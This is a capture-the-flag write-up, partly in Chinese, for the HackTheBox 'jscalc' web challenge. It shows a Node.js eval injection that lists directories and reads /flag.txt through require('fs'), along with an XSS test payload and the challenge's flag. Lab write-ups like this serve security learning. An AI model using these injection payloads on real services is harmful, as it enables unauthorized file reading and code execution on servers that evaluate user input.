---
title: 'HackTheBox: jscalc'
disqus: hackmd
---

HackTheBox: jscalc Writeup
===


## Table of Contents

[TOC]

## Topic

### Lab
#### HackTheBox: 
https://app.hackthebox.com/challenges/jscalc

### Initial Enumeration

●Start Machine: 
http://94.237.57.59:46780/

![image](https://hackmd.io/_uploads/rkVED31W0.png)

(Calculate)\
![image](https://hackmd.io/_uploads/rk8YO6kW0.png)

![image](https://hackmd.io/_uploads/SJgyca1-0.png)


## Solution

### 1.Code Review
● main.js
```javascript=
let formula = document.getElementById('formula');
let form    = document.getElementById('form');
let output  = document.getElementById('output');

const flash = (message, level) => {
    alerts.innerHTML += `
        <div class="alert alert-${level}" role="alert">
            <button type="button" id="closeAlert" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
            <strong>${message}</strong>
        </div>
    `;
};

form.addEventListener('submit', e => {
	e.preventDefault();

	fetch('/api/calculate', {
		method: 'POST',
		body: JSON.stringify({
			formula: formula.value
		}),
		headers: {'Content-Type': 'application/json'}
	}).then(resp => {
		return resp.json();
	}).then(resp => {
        result = resp.message.toString();

		if (result.includes('wrong')) {
            flash(result, 'danger');

            setTimeout(() => {
                document.getElementById('closeAlert').click();
            }, 2000);

            return;
        }
        
        flash(result, 'success');

        setTimeout(() => {
            document.getElementById('closeAlert').click();
        }, 2000);
            
        output.value = result;
        
    })
});

```
> "formula":"100*10-3+340"\
> 用JSON格式 POST 到 fetch /api/calculate\
> Content-Type: application/json

● /routes/index.js
```javascript=
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
	let { formula } = req.body;

	if (formula) {
		result = Calculator.calculate(formula);
		return res.send(response(result));
	}

	return res.send(response('Missing parameters'));
})

module.exports = router;

```
> GET / 顯示index.html\
> POST /api/calculate，如果存在formula，則使用Calculator.calculate運算

### 2.Attempt
#### 2.1 XSS
> [!NOTE]
> main.js 沒有對輸入的payload進行過濾，嘗試XSS

```payload
55688+'<img src=chw onerror="alert(55688)">'
```

![image](https://hackmd.io/_uploads/rkjssa1Z0.png)

#### 2.2 JSON Object
package.json
```json=
{
	"name": "jscalc",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"nodeVersion": "v8.12.0",
	"scripts": {
		"start": "node index.js"
	},
	"keywords": [],
	"authors": [
		"makelaris",
		"makelarisjr"
	],
	"dependencies": {
		"body-parser": "^1.19.0",
		"express": "^4.17.1"
	}
}



```
> [!NOTE]
> 從package.json可以得知使用Node.js\
> 嘗試在JSON格式中注入Node.js指令 

```payload
process.cwd()
```
![image](https://hackmd.io/_uploads/SyNXiCJZA.png)
> [!IMPORTANT]
> ● process.cwd() 是 Node.js 中的一個函式，用於獲取當前工作目錄（Current Working Directory）的路徑。所謂當前工作目錄是指 Node.js 進程當前正在運行的目錄。

> 成功得到Server回應

### 3. Node.js in JSON
#### 3.1 Node.js require('fs')
```payload
require('fs')
```
![image](https://hackmd.io/_uploads/SyyZLCkbA.png)\
> [!IMPORTANT]
> ● require('fs') 是 Node.js 中用於引入文件系統模組的標準語法。文件系統模組（fs）允許 Node.js 應用程式直接與文件系統進行交互，包括讀取檔案、寫入檔案、刪除檔案等操作。

#### 3.2 Browse /app
前面透過process.cwd()當前目錄在/app，利用readdirSync讀取當前目錄下內容
```payload
require('fs').readdirSync('/app').toString()
```
![image](https://hackmd.io/_uploads/SkHP2Cy-R.png)

#### 3.3 Find Flag.txt
```payload
require('fs').readdirSync('../').toString()
```
![image](https://hackmd.io/_uploads/BJlT2R1ZR.png)

### 4. Get FLAG
```payload
require('fs').readFileSync("/flag.txt").toString()
```
> [!IMPORTANT]
> ● require('fs').readFileSync() 是 Node.js 中用於同步讀取檔案的函式。它的作用是以同步的方式從檔案系統中讀取檔案的內容，並將其返回為字串或二進位緩衝區。

![image](https://hackmd.io/_uploads/S1VoR0k-0.png)

> **FLAG: HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}**

###### tags: `Web` `CTF` `Node.js`

